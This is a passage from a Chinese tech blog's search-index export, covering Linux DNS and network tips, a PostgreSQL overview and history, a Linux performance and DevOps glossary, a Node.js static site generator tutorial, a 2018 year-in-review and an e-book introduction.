and traffic recorder with on-the-fly TLS cert generation. arpfox TipsDNS Tools chrome DNS Cache 1234# 浏览器chrome://net-internals/#dns# 清空缓存“clean host cache” Windows DNS Cache 1234# 查看缓存ipconfig /displaydns# 清空缓存ipconfig /flushd ns Mac OS X 1$ lookupd -flushcache Linux 12# 清空DNS缓存，重启 nscd 进程$ /etc/rc.d/init.d/nscd restart 网卡流量 nLoad123456wget http://www.roland-riegel.de/nload/nload-0.7.2.tar.gztar zxvf nload-0.7.2.tar.gzcd nload-0.7.2./configuremake -j4make install bond123456789101112131415161718192021222324252627282930# modinfo bondingvi /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0BOOTPROTO=noneONBOOT=yesIPADDR=192.168.1.10GATEWAY=192.168.1.1NETMASK=255.255.255.249USERCTL=NO$ more ifcfg-eth0#HWADDR=74:86:7A:DD:C3:68DEVICE=eth0BOOTPROTO=noneONBOOT=yesMASTER=bond0SLAVE=yesUSERCTL=NO$ more ifcfg-eth1##HWADDR=74:86:7A:DD:C3:69DEVICE=eth1BOOTPROTO=noneONBOOT=yesMASTER=bond0SLAVE=yesUSERCTL=NOmore /etc/modprobe.confoptions bonding mode=1 miimon=100 拓展阅读电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 案例与实务 最佳工程实践：Stack Overflow 架构 - 2016 Edition 最佳工程实践：Oracle 数据库迁移割接实践 最佳工程实践：基于LVS的AAA负载均衡架构实践 VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer 扩展阅读 远程通信协议：从 CORBA 到 gRPC Wireshark 使用技巧 参考文献 RFC-1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION Writing DNS messages from scratch using Go hosts - static table lookup for hostnames | Linux Programmer’s Manual strace 跟踪进程中的系统调用 Anatomy of a Linux DNS Lookup – Part I Anatomy of a Linux DNS Lookup – Part II Find DNS records programmatically Build a DNS server in Golang 网卡收包流程 | 原创 2017-03-16 信鸽工程师Henry 腾讯大数据 Linux下进程/程序网络带宽占用情况查看工具 – NetHogs 每天一个linux命令（53）：route命令]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：PostgreSQL 数据库]]></title>
    <url>%2F2018%2F01%2F03%2FOpenSource-DB-PostgreSQL%2F</url>
    <content type="text"><![CDATA[摘要 PostgreSQL 的时代到来了吗 PostgreSQL 简史 PostgreSQL ABC PostgreSQL是对象-关系型数据库，BSD 许可证。拼读为”post-gress-Q-L”。 PostgreSQL 的时代到来了吗 ? 作者： Tony Baer 原文： Has the time finally come for PostgreSQL?（有删节） 近30年来 PostgreSQL 无疑是您从未听说过的、最常见的开源 SQL 数据库。PostgreSQL 经常身居幕后：从 EnterpriseDB 到 Amazon Redshift 、Greenplum、Netezza 及其他许多商业数据库产品。 最近在许多商业产品的推动下，PostgreSQL 逐渐走向前台。大约十年前 EnterpriseDB 打开了潘多拉的盒子 —— 作为商业支持平台提供 Oracle 的替代品。特别是最近一段时间，云服务商提供了一系列托管产品：从 Amazon Wed Services 开始, 支持 PostgreSQL 作为其托管关系数据库服务 (Relational Database Service，RDS) 之一。 过去一年 AWS 和它的竞争对手将 PostgreSQL 的市场前景提升了一个等级。AWS 推出了兼容 PostgreSQL 的原生云数据库平台 Amazon Aurora ，作为回应 Microsoft 和 Google 推出了 Azure Database for PostgreSQL 和 Cloud SQL for PostgreSQL 解决方案。 Mark Porter（马克·波特，Amazon Aurora PostgreSQL 和 Amazon RDS for PostgreSQL 主管） 不得不通过一些花哨的方法表达 AWS 对开源社区的支持，例如修复 Bug、提供免费测试帐户和其他形式的财政支助。PostgreSQL 在 AWS 上的实现不是开源的, 因为它是为 AWS 自身的云基础结构而设计。 PostgreSQL 虽然是聚焦于事务型数据库的开源项目, 但是许多基于它的商业产品都是大规模并行处理数据仓库（Massively Parallel Processing，MPP）。出于这个原因, Greenplums，Netezzas 和Redshifts 创建了自己的开源 forks 项目, 甚至添加像 columnar tables 这样的基本功能。 PostgreSQL 的一个常见主题是支持企业级负载的开源关系数据库。关于这一点，竞争者包括 MySQL 和 MariaDB , 但仍然存在差异, PostgreSQL 支持更复杂的 SQL 函数和数据类型, 包括数组（arrays）, 连接（joins）和视图（Window Functions）等等。 另一个原因是出现了“replace Oracle”的口号, PL/pgSQL 的设计非常类似 Oracle PL/SQL。这正是EnterpriseDB 多年以来一直提倡的，同时获得了 美国金融业监管局(Financial Industry Regulatory Authority，FINRA) 的支持。FINRA 将大约 650 个 Oracle 实例迁移入云（ Amazon RDS for PostgreSQL），作为一个更大战略的一部分, 将其整个部署在 IT 基础设施上的业务迁移到 AWS。根据 FINRA 首席开发者 Steve Downs 的说法，对于 Oracle DBA 而言，在 PostgreSQL 中使用诸如对象/关系映射（object/relational mappings）、存储过程（stored procedures）以及利用视图（view）支持复杂查询的功能，给人一种似曾相识的感觉。 然而, 作为两种不同的数据（包括 SQL 实现）PostgreSQL 和 Oracle 之间毕竟存在显著差异。例如数据库如何处理数字和可变字符字段、同义词、复制 (replication，PostgreSQL 不像 Oracle 那样成熟 ) 以及实例化视图刷新等等。 PostgreSQL 有它独特的优势，即作为第三方寻求自主数据库产品的开源平台。重要的是, 去年秋季发布的最新 10.0 版本（2017年11月09日）, 解决了在 Oracle 或 SQL Server 产品中被视为理所当然的功能，包括声明式表分区（declarative table partitioning）、改进后的复制功能（replication）, 发布/订阅（publish/subscribe）、仲裁提交（quorum commits，对于云部署可能非常有用)。 总之，PostgreSQL 还有很多需要追赶的领域, Oracle 或 SQL Server 用户也仍然有理由继续使用他们的平台。大部分的差异将体现在数据库的实施, 而不是一些具体的功能特性。这种差异将主要体现在数据库弹性、自动化、基础架构选型以及云计算的规模等方面。有了 AWS、Azure 和 Google Cloud 的加持（非常值得注意的一个信号），若干年后 PostgreSQL 可能最终走出阴影。 PostgreSQL 简史PostgreSQL 开始于 UC Berkeley 的 Ingres 计划，经历了长时间的演变。 Ingres 计划的领导者 Michael Stonebraker（迈克尔·斯通布雷克，2015 年图灵奖得主，目前是麻省理工学院兼职教授）在 1982 年离开 Berkeley 进入商业公司 Ingres，1985年又返回 Berkeley 开始新项目 Postgres 。Postgres 项目组从1986年开始发表了一些描述系统基本原理的论文并发行了版本1、2、3 、4，到1993年就有大量的用户存在了。尽管 Postgres计划正式的终止了，BSD许可证却使开发者可以获得副本并进一步开发系统。1994年，两个 UC Berkeley 的研究生 Andrew Yu 和 Jolly Chen 增加了一个SQL语言解释器来替代早先的基于 Ingres 的 QUEL 系统，创建了 Postgres95。 1996年重命名为：PostgreSQL。（版本 6.0 ） 2000年，前 Red Hat 投资者筹组了一间名为Great Bridge的公司来商业化PostgreSQL，以和其他商用数据库厂商竞争。2001年末，Great Bridge 因市场原因终止营运。2001年，Command Prompt, Inc. 发布了最老牌的PostgreSQL 商业软件 Mammoth PostgreSQL，并提供开发者赞助和贡献 PL/Perl、PL/php、维护 PostgreSQL Build Farm 等。 2005年1月 ，Pervasive Software 宣布参与社区及商业支持，直到 2006 年 7 月退出。2005年1月19日，版本 8.0 发行。自 8.0 后，PostgreSQL以原生（Native）的方式，运行于Windows系统。2006年6月，Solaris 10 包含 PostgreSQL一起发布。 2012年09月10日，PostgreSQL 发布 9.2 版本，主要在性能方面的提升，也包括一些新的 SQL 特性。2016年10月27日，PostgreSQL 发布 9.6.1 版本。2017年11月09日，PostgreSQL 发布 10.1 版本。 ABC12345678910111213141516171819202122232425262728293031323334353637383940# install$ brew install postgresql# version$ pg_ctl -Vpg_ctl (PostgreSQL) 10.1# initdb -- 创建一个新的PostgreSQL数据库簇（cluster）,单个服务端实例管理的多个数据库的集合。# 创建数据库数据的宿主目录，生成共享的系统表 （不属于任何特定数据库的表）和创建template1 和postgres数据库$ initdb /Users/yanrui/Data/TestPG# start$ pg_ctl -D /Users/yanrui/Data/TestPG startwaiting for server to start....2018-01-03 14:13:17.005 CST [37621] LOG: listening on IPv4 address "127.0.0.1", port 54322018-01-03 14:13:17.005 CST [37621] LOG: listening on IPv6 address "::1", port 54322018-01-03 14:13:17.006 CST [37621] LOG: listening on Unix socket "/tmp/.s.PGSQL.5432"2018-01-03 14:13:17.048 CST [37623] LOG: database system was shut down at 2018-01-03 14:11:30 CST2018-01-03 14:13:17.066 CST [37621] LOG: database system is ready to accept connections doneserver started# port listenbash-3.2$ netstat -an | grep LISTEN tcp6 0 0 ::1.5432 *.* LISTEN# createdbbash-3.2$ createdb -O[owner] test_db# default [当前登录系统用户名]bash-3.2$ psql2018-01-03 18:14:37.537 CST [45864] FATAL: database "yanrui" does not existpsql: FATAL: database "yanrui" does not existYou have new mail in /var/mail/yanrui# login inbash-3.2$ psql test_dbpsql (10.1)Type "help" for help.# log outtest_db=# \q (Ctrl+D)# 卸载$ brew uninstall postgres# 开机$ launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist$ rm -rf ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist Architecture OverView 扩展阅读 Data Model Generation for PostgreSQL How FINRA is Migrating to Postgres 参考文献 PostgreSQL新手入门 Postgres full-text search is Good Enough! | JULY 13,2015 Showdown: MySQL 8 vs PostgreSQL 10 兼容 PostgreSQL 的 Amazon Aurora 已在 AWS GovCloud（美国）区域推出 | Jun 14,2018 Amazon Aurora 产品信息 Case study: Operating system kill signals on PostgreSQL | BY POSTGRESHELP · PUBLISHED FEBRUARY 5, 2019 · UPDATED FEBRUARY 10, 2019]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2018年度盘点]]></title>
    <url>%2F2018%2F01%2F01%2FCheck2018%2F</url>
    <content type="text"><![CDATA[摘要 想要解决一个有趣的问题，先去找一个让你感兴趣的问题。– 《大教堂与集市》 Introduction of Machine Learning Intelligence &amp; Spider Creativity &amp; Freedom This article is part of an Autobiography tutorial series. Make sure to check out my other articles as well: 我的 2019 年度盘点 我的 2018 年度盘点 我的 2017 年度盘点 我的 2016 年度盘点 我的 2012 阅读书单 一、Core Topics Hacker: Creativity &amp; Freedom Economist: Intelligence &amp; Spider、Intellectual Property Law Introduction to Machine Learning：Mathmetics &amp; Algorithms Skills: Golang、R 二、年度成果年度导师 我们现在生活在一个没有科学的时代，几乎人们所有的交流、电视上的言论和书本，所有这些都充斥着不科学的东西。不是说那些内容不好，我是说他们是不科学的。于是，就出现了大量打着科学旗号的智力专制。科学的各个学科门类在其发展过程中都有过这样的教训：认为先辈大师们字字珠玑、说的都是绝对真理，这样的信念是很危险的。—— 理查德·费曼 1966年4月 科学锻炼 Tech Blog 上线一个纯洁的域名 https://riboseyim.com 粤ICP备18143203号-1 粤公网安备44010602005988号 过程改进 &amp; 方法论 芝加哥大学：贫穷如何改变你的思维模式 黑客与技术、产业及其精神世界 DevOps 漫谈：从作坊到工厂的寓言故事 技术团队中的作家 我的写作工具链（v6-201812） 知识产权法（Intellectual Property Law） 数学常识| 如何度量复杂性 医学常识| IT 工程师养生指南 医学常识| NIH 情绪健康检查单 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 专利实务（发明）申请号：201811427043.2 三、Information Technology 数据可视化（八）Program,Data and Classical Music 动态追踪技术(五)：Welcome DTrace for Linux DevOps 漫谈：分布式追踪系统标准体系 DevOps 漫谈：开源分布式跟踪系统 OpenCensus Uber 开源 Java 分布式应用追踪工具：JVM Profiler DevOps 漫谈：从作坊到工厂的寓言故事 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:经济学家谈人工智能 Machine Learning:人工智能媒体报道集 Cyber-Security: 黑客与技术、产业及其精神世界 DevOps 漫谈：2018 年度 Docker 用户报告 - Sysdig Edition DevOps 漫谈：基础设施部署和配置管理 2018 年度 Docker 用户报告 - Sysdig Edition 数据可视化（五）基于网络爬虫制作可视化图表 From Better To Advanced | Go 语言开发入门书单 数据可视化（十）公共数据源列表 开源技术架构漫谈：PostgreSQL 数据库 How Linux Works(四)：Network Linux Commands Extension 谁是王者：macOS vs Linux Kernels ？ 四、Economist 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 嗑药简史（三）：瘾品管制背后的情与法 经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林 经济学人：No PhD, No Problem (人工智能教育产业化) The Economist 2018年度推荐书单 The Economist 2017年度推荐书单 再次强调一手研究的重要性 六、Culture &amp; History 古典音乐低俗史 数据可视化（八）Program,Data and Classical Music 红楼故事：康熙的秘密情报系统 荐书|帝国的铸就 演出活动 类别 剧目 演出 地点 时间 话剧 荒诞喜剧《破阵子》 广东演艺中心 201804 话剧 《雁叫长空》 厦门歌舞剧团 广州大剧院 201805 越剧 《牡丹亭》 浙江越剧团 广东演艺中心 201805 越剧 《红楼梦》 上海越剧团 广州大剧院 201806 器乐 主题：古韵今声 古琴 星海音乐厅 20181020 古典 主题：柴科夫斯基 星海音乐厅 20180930 合唱 童声合唱团 星海音乐厅 话剧 童声合唱团 星海音乐厅 器乐 唢呐 广东民族乐团 星海音乐厅 话剧 《麦克白》 广州大剧院 户外活动 类别 地点 时间 美术奇观 历史遗址 洛阳龙门石窟 201807 地质奇观 历史遗址 郑州黄河风景区 （民间宗教） 201807 地质奇观 历史遗址 登封嵩山少林寺（佛教全国重点寺院） 201809 历史遗址 中共赣南省委旧址（耶稣宝血堂）苏区赣南省裁判部旧址 苏区赣南省政治保卫局旧址红四军军部/政治部旧址（葛氏宗祠） 201802 历史遗址 广州·六榕寺（佛教全国重点寺院） 历史遗址 广州·詹天佑故居 历史遗址 广州·沙面 历史遗址 天津·溥仪故居 历史遗址 天津·庆亲王府 历史遗址 大爆炸遗址公园 Unfinished 玩转编程语言:基于Golang开发Web应用 PriviewMachine Learning:机器学习技术与知识产权法 Preview关于唐史 Preview唐史|狄仁杰 Preview《嗑药简史：行为成瘾》 Preview关于交响乐团 Machine Learning:WordBook Machine Learning:Training Models Sites Map RiboseYim’s Home(riboseyim.github.io) RiboseYim’s Tech Blog(riboseyim.com) RiboseYim’s Twitter RiboseYim’s Telegram 参考文献 为演好男神，越剧小生专业户的她研究起《来自星星的你》]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-Perf-WordBook]]></title>
    <url>%2F2017%2F12%2F23%2FLinux-Perf-WordBook%2F</url>
    <content type="text"><![CDATA[摘要 dynamic tracing，动态追踪技术 kk 指标IOPS 每秒的I/O操作数 吞吐量 评价执行速率。数据传输：字节／秒或比特／秒数据库：秒操作数，秒业务数 延迟 描述操作里等待服务的时间。某些情况下等同于响应时间。 使用率 给定时间区间内，资源的繁忙程度。如内存使用率。非空闲时间（Brendan定义） 1.基于时间： U=B/TU是使用率，B是T时间内系统繁忙时间，T是观测周期。 2.基于容量： observer effect ,观测者效应：指标的获取不是免费的。 响应时间 一次操作完成的时间。包括用于等待和服务的时间。 饱和度 指的是某一资源无法满足服务的排队工作量。随着工作量增加而对资源的请求超过资源所能处理的程度。 瓶颈 限制性资源。 工作负载 系统的输入、输出对系统所施加的负载叫工作负载。如数据库的工作负载就是客户端发出的请求和指令。 缓存 用于复制或存储一定量数据的高速存储区域。ps:相对概念。只要存在高低速差，即可视为广义缓存？ 1.冷：填充的数据为空，或填充无用的数据，命中率为02.热：填充的都是常用数据3.温：命中率还没有达到理想的高度4.热度： PProfiling 剖析 Perturbation 扰动 同义词： ROI 投资回报率 性能技术取决于投资回报率！横跨大西洋连接纽约交易所和伦敦交易所的光缆，预算3亿美金，用以减少6ms的传输时延 SUT,system under test 受测系统 方法论分类：信息收集、观测分析、容量规划、统计分析、调优、实验分析 USE方法 （utilization,saturation,errors）for(资源;所有资源;i++){ 1.出现错误？ 2.使用率高？ 3.饱和？} Scheduling Algorithm 调度算法 Code Name 名称 说明 RR round－robin 轮询调度 单纯依次请求真实服务器。均等分发 WRR weighted round-robin 加权轮询调度 引入加权值来控制分发比率。 LC least-connection 最小连接调度 将新的请求连接到当前连接数最少的服务器 WLC weighted least-connection 加权最小连接调度 （连接数＋1）／加权值。 SED shortest expected delay 最短预期延时调度 选择响应速度最快的那台服务器，选择状态ESTABLISHED的连接数最少的服务器。与WLC类似，但WLC会把TIME_WAIT或FIN_WAIT的连接数计算在最小因素中 NQ never queue 不排队调度 最优先选择连接数为0的服务器 SH source hashing 源地址散列调度 对发出请求的IP地址计算散列值 DH destination hashing 目标地址散列调度 对需要接收请求的目标地址计算散列值 LBLC locality-based least-connection 基于局部性的最小连接 在连接数没有超过加权值指定的值时，将选择同一台服务器 LBLCR locality-based least-connection with replication 带复制的基于局部性最小连接 当所有服务器的连结数都超过加权值指定的值时，将选择连接数最少的那台服务器 DevOps-WordBookAAvailability () [可用性]1系统停止的可能性。 Algorithm()[算法] Scheduling Algorithm 调度算法 BBottleneck () [瓶颈]1阻碍系统整体性能提升的地方。 CCDN (Content Delivery Network) [内容分发网络]1从散布在全世界的缓存服务器中，选择离客户端较近的服务器来发送信息，据此实现性能的提升 DDC (Data Center) [数据中心]1容纳服务器设备。配备空调，冗余电源。配备火灾、地震等应急措施。 Daemon () [守护程序]1在后台持续运行并发挥作用。 EEnvironment () [环境]12Production Environment 生产环境Staging Environment 准生产环境 FFailover () [故障转移]12在冗余系统中，活动节点（Active Node）停止时，自动切换到备用节点（Backup Node）.如果不是自动切换，而是手动，通常叫作Switchover. Failback ()[故障恢复] File System () [文件系统]12分类：Memory File System:建立在内存中的文件系统 G** () []12 HHealth Check () [健康检查]12确认检查对象的状态是否正常。例如：确认服务器是否能响应ping,是否能应答HTTP等。 I** () []12 J** () []12 KKeepalived () [内容分发网络]1http://www.keepalived.org LLVS (Linux Virtual Server) [Linux虚拟服务器]12原伟项目名，旨在搭建具有可扩展性的、实用性高的系统。http://www.linuxvirtualserver.org Load Balancer () [负载均衡器]12位于客户端和服务器之间，将客户端的请求分散到后端的多台服务器。Load［负载］大致力可分为“CPU负载”和“IO负载”。详见：http://www.jianshu.com/p/db8e8a2884ef Latency () [延迟]1通常指数据投递完成所花费的时间。 M** () []12 NNIC (Network Interface Card) [网络接口卡，网卡]1网络接口的总称 Netfilter12Linux内核中操作网络数据包所需的协议框架。实现分组过滤的iptables和负载均衡的IPVS也应用了Netfilter协议。 OOSI (Open Systems Interconnection) [参考模型]12345分为七层（Layer）框架，例如：第七层：应用层。HTTP及SMT等协议第四层：传输层。TCP及UDP第三层：网络层。IP、ARP及ICMP第二层：数据链路层。以太网等 OSS (OpenSource Software) [开源软件]12345```## P**Proxy** () [代理] Transparent Proxy:透明代理 123## Q**** () [] 1234## R**Redundancy** () [冗余] 将系统的构成要素配置多个，即使其中一个发生故障而停止运作，也可以切换到备用设备以使服务不停止。1**Resource** () [资源] 指CPU,内存，磁盘空间等1234## S**Scalability** () [可扩展性] 随着用户的增多以及规模的扩大，在某种程度上扩展系统以加强应对的能力。Scale-out:横向扩展。例如：将服务分摊到多台服务器Scale-up:纵向扩展。 例如：提升单个服务器性能12**SPO** (Single Point of Failure) [单点故障] 若此处出现问题，就会令整个系统停止，即系统要害。12345## T**Throughput** () [吞吐量] 代表单位时间的传送量。例如：大巴车和小汽车。1234## U**** () [] 1234## V**VIP** (Virtual IP Address) [虚拟IP地址] 浮动分配给某项服务或功能的IP地址。例如负载均衡器中接收客户端请求的IP地址。123## W**** () [] 1234## X**** () [] 1234## Y**** () [] 1234## Z**** () [] `]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:基于Node.js构建自定义代码生成器]]></title>
    <url>%2F2017%2F12%2F21%2FLanguage-Auto-Generator%2F</url>
    <content type="text"><![CDATA[摘要在真实的软件开发过程中，无论使用何种编程开发语言，都不可避免的会遇到代码重复的问题。如何处理重复的问题，可以选择情怀（手动再敲一遍），也可以选择 Copy-to-Copy ，或者选择代码生成器。正如在之前的文章 我的写作工具链 中，我介绍过一种 Blog 生成器 hexo ，可以将 Markdown 格式的内容自动生成方便发布的 HTML 格式。本文将还原 hexo 的运行原理，为解决类似问题提供一些参考思路。 示例：通过 Markdown 文件声明模板（源代码），通过脚本生成 HTML 文件（目标代码），并预览代码生成效果。 一、Hello Node.jsStep 1: 准备环境 (dependencies)开发语言 Node.js, 一个能够运行 JavaScript 的开放源代码、跨平台运行环境。 npm init — 初始化 root 目录 npm i -s live-server — 该模块支持本示例生成静态 HTML 站点，提供热部署能力 npm i -s nodemon — 该模块支持当文件变化自动执行重构任务 npm i -s concurrently — 该模块支持支持并发执行任务、脚本(scripts/tasks) npm i -s markdown-it — 该模块提供 Markdown 文件解析器 1234567891011121314151617mkdir project-generatormkdir project-generator/pagesmkdir project-generator/pages_metamkdir project-generator/jsmkdir project-generator/cssmkdir project-generator/imagesmkdir project-generator/build_scriptsmkdir project-generator/buildcd project-generatornpm init npm i -s concurrentlynpm i -s fsnpm i -s fs-extranpm i -s markdown-itnpm i -s live-server npm i -s nodemon Step 2: 准备元数据例如：pages/index.md12345# Home pageHello world![Link to another page](./other.html) 例如：pages_meta/index.json 用于存储一些需要的元数据（参数、固定内容等），JSON 文件格式方便后面调用。 12345678910111213&#123; "lang": "en", "title": "Index", "stylesheets": ["./css/style.css"], "scripts": ["./js/main.js"], "charset": "utf-8", "description": "This is a page", "keywords": "page, sample", "author": "None", "favicon": "./images/favicon.png", "viewport": "width=device-width, initial-scale=1", "extra": []&#125; Step 3: 编写模板和构建脚本（template &amp; build Script）代码生成器中需要定制开发的部分包括 builder.js 和 pages_template.js。build.js 相当于 main 函数，控制入口和流程，加载资源数据、调用 generator 任务，与 Makefile 和 Ant.xml 非常类似。pages_template.js 依赖的组件是 markdown-it ，负责将 Markdown 源文件转换输出成 HTML 文件。builder.js 将 pages_template.js 视为一个模块引用：pageTemplate.generatePage(pageContent, metaData)) 因此可以根据需要定制多个不同的 XXX_template.js 或者在每个 template.js 中定义其它函数。 builder.js 1234567891011121314151617181920212223242526272829303132333435363738394041var pageTemplate = require('./page_template');// All paths are relative to package.json.var pagesPath = './pages';var pagesMetaPath = './pages_meta';var copyFolders = ['./images', './css', './js'];var outputPath = './build';// Cleanconsole.log('Cleaning previous build...');for (var file of fs.readdirSync(outputPath))&#123; fs.removeSync(path.join(outputPath, file));&#125;//Loadingconsole.log('Loading pages metadata...'); for(var pageMeta of fs.readdirSync(pagesMetaPath))&#123; pagesMeta[pageMeta] = fs.readFileSync(path.join(pagesMetaPath,pageMeta),'utf8'); &#125;&#125;// Generateconsole.log('Generating pages...');for(var page of Object.entries(pages)) &#123; var pageName = page[0].slice(0, page[0].lastIndexOf('.')); var metaData = pagesMeta.hasOwnProperty(pageName+'.json') ? JSON.parse(pagesMeta[pageName+'.json']) : &#123;&#125;; metaData.title = metaData.title || pageName; var pageContent = page[1]; fs.writeFileSync( path.join(outputPath,pageName+'.html'), pageTemplate.generatePage(pageContent, metaData)); &#125;&#125;// Copyconsole.log('Copying folders...'); for(var copyFolder of copyFolders)&#123; fs.copySync(copyFolder, path.join(outputPath,copyFolder)); &#125; pages_template.js1234567891011121314151617181920var md = require('markdown-it')();module.exports = &#123; generatePage: function(pageContent,pageMeta)&#123; return`&lt;!DOCTYPE html&gt;&lt;html lang="$&#123;pageMeta.lang || this.defaultMeta.lang&#125;"&gt; &lt;head&gt; &lt;title&gt;$&#123;pageMeta.title || this.defaultMeta.title&#125;&lt;/title&gt; &lt;meta charset="$&#123;pageMeta.charset || this.defaultMeta.charset&#125;"&gt; &lt;meta name="description" content="$&#123;pageMeta.description || this.defaultMeta.description&#125;"&gt; &lt;meta name="keywords" content="$&#123;pageMeta.keywords || this.defaultMeta.keywords&#125;"&gt; &lt;meta name="author" content="$&#123;pageMeta.author || this.defaultMeta.author&#125;"&gt;&lt;/head&gt;&lt;body&gt; $&#123;md.render(pageContent)&#125;&lt;/body&gt;&lt;/html&gt; `; &#125;&#125; Step 4: 优化任务脚本在 Step 1 步骤中，npm init 创建了一个文件：package.json，我们可以定义其中的 “scripts” , 执行 npm run start 将默认在 1080 端口开启 Web 服务。 1234567891011&#123; "name": "coffee", "version": "1.0.0", "description": "beyond my coffee", "main": "index.js", "scripts": &#123; "build-pages": "node ./build_scripts/builder.js", "start": "concurrently --kill-others \"nodemon -e js,json,css,md -i build -x \\\"npm run build-pages\\\"\" \"live-server ./build\"" &#125;, "author": "@RiboseYim"&#125; 1234567891011121314151617181920212223242526272829303132333435363738$ npm run build-pages&gt; coffee@1.0.0 build-pages /generator-code&gt; node ./build_scripts/builder.jsCleaning previous build...Loading pages...Loading pages metadata...Generating pages...Copying folders...Done!$ npm run start&gt; coffee@1.0.0 start /Users/yanrui/project/generator-code&gt; concurrently --kill-others "nodemon -e js,json,css,md -i build -x \"npm run build-pages\"" "live-server ./build"[0] [nodemon] 1.14.1[0] [nodemon] to restart at any time, enter `rs`[0] [nodemon] watching: *.*[0] [nodemon] starting `npm run build-pages`[1] Serving "./build" at http://127.0.0.1:8080[1] Ready for changes[1] GET /js/main.js 404 42.133 ms - 23[1] GET /js/main.js 404 12.204 ms - 23[0][0] &gt; coffee@1.0.0 build-pages /Users/yanrui/project/generator-code[0] &gt; node ./build_scripts/builder.js[0][0] Cleaning previous build...[0] Loading pages...[0] Loading pages metadata...[0] Generating pages...[0] Copying folders...[0] Done![0] [nodemon] clean exit - waiting for changes before restart[1] Change detected build/index.html[1] Change detected build/images ApplicationHexoHexo StartupHexo Theme Hexo Theme Cafe Hexo Questions Hexo g 失败【Uncaught SyntaxError: Invalid or unexpected token】：临时办法-复制到Editplus查看乱码 扩展阅读 玩转编程语言系列 参考文献 Building a simple static page generator with Node.js]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《Linux Perf Master》]]></title>
    <url>%2F2017%2F12%2F21%2FeBook-LPM%2F</url>
    <content type="text"><![CDATA[摘要 《The Linux Perf Master》 《The Cyber-Security Master》 《The Machine Learning Master》 If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman 简介《The Linux Perf Master》(暂用名) 是一本关于开源软件的电子书。本书与常见的专题类书籍不同，作者以应用性能诊断入手，尝试从多个不同的维度介绍以 Linux 操作系统为核心的开源架构技术体系。全书分为以下几个部分：第一部分：性能诊断入门。介绍 Linux 性能诊断的入门方法，包括资源利用评估、性能监控、性能优化等工作涉及的工具和方法论，以 Stack Overflow 为例介绍一个真实的应用系统架构组成；第二部分：基础设施管理工具。介绍 Ganglia,Ntop,Graphite,Ansible,Puppet,SaltStack 等基础设施管理 &amp; 可视化工具；第三部分：操作系统工作原理。介绍 Linux 操作系统工作原理（Not only Works,But Also How），从动态追踪技术的角度理解应用程序与系统行为；第四部分：通信协议与网络工程。介绍基于 TCP/IP 协议的负载均衡技术，封包过滤技术和态势感知技术；微服务之后的挑战：分布式追踪系统（Planning);第五部分：信息安全篇。介绍木马入侵、黑客攻击、防护与检测，IPv6 、容器等技术发展对安全工作的挑战；介绍信息安全法律；第六部分：工程管理篇。尝试跳出 IT 视野讨论人才培养，DevOps 组织、效率和工程管理方法；第七部分：社区文化篇。介绍黑客文化、开源作者、开发者社区和知识产权法，“技术首先是关于人的”（Technology is first about human beings）。 背景：我的第一本电子书2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 2017-02-10 首次发布于 GitBook 平台，主题以 Linux 性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例。该书编辑过程中，早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：我的写作工具链（持续更新）。 GitBook 地址 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details Amazon 上架 缺少资源：代理人 国内出版 缺少资源：出版社 《Linux Perf Master》：Edition 1.0 | 2016 | 电子工业出版社 | 选题阶段枪毙 GitBook 访问数据 时间点 订阅用户数 Downloads Unique visitors Page Views 说明 201701 —– —– —– —– GitBook Edition 0.1 20170630 135 4,206 4,936 —– GitBook Edition 0.2 20170830 154 4,503 5,989 23,505 —– 20170930 157 4,553 6,471 